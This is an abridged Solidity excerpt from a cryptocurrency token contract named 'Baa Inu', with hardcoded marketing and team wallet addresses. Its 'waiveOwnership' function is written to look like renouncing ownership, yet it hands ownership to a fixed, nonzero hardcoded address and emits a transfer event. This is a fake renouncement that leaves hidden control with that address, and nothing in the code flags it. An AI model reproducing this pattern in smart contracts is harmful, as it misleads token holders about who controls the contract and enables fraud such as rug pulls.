...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x308DCCCE156538fBD72eCC3d0EC9dA90Ab1a750a));
        _owner = address(0x308DCCCE156538fBD72eCC3d0EC9dA90Ab1a750a);
    }
...
contract BaaInu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Baa Inu";
    string private _symbol = "BAA";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x4C48018D670045f5D6f40D6C9E6971285e724b76);
    address payable public teamWalletAddress = payable(0xC1eD44119234E6cEEF58966AE43e05Ad43063D67);
